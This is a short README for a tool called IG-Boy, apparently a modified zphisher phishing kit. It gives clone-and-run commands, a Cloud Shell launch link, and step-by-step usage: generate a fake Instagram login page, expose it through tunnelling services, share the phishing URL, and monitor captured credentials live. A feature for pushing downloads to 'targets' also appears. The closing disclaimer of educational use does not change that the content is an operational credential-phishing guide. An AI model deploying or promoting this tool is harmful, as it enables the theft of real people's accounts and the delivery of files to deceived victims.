# IG-Boy

A streamlined Instagram phishing testing tool with automatic configuration.

## Quick Start with Google Cloud Shell

Click the button below to instantly launch this project in Google Cloud Shell:

[![Open in Cloud Shell](https://gstatic.com/cloudssh/images/open-btn.svg)](https://shell.cloud.google.com/?cloudshell_git_repo=https://github.com/dso904/IG-Boy&cloudshell_print=install.txt&show=terminal)

This will:
- Open a new Google Cloud Shell session
- Automatically clone the IG-Boy repository
- Set up your terminal environment

## Manual Installation

If you prefer to install manually:

```bash
git clone https://github.com/dso904/IG-Boy
cd IG-Boy
bash zphisher.sh
```

## Features

- **Auto-configured**: Automatically selects Instagram Traditional Login Page
- **Clean Interface**: No branding or unnecessary menus
- **Download Integration**: Built-in file download feature for targets
- **Multiple Tunneling Options**: Localhost, Cloudflared, or LocalXpose

## Usage

1. Launch the script with `bash zphisher.sh`
2. Enter your download link (optional - press Enter to skip)
3. Select your preferred tunneling method
4. Share the generated phishing URL
5. Monitor captured credentials in real-time

## Requirements

- PHP
- cURL
- unzip

These dependencies are automatically installed on first run.

## Disclaimer

This tool is for educational and authorized security testing purposes only. Unauthorized use is illegal and unethical.
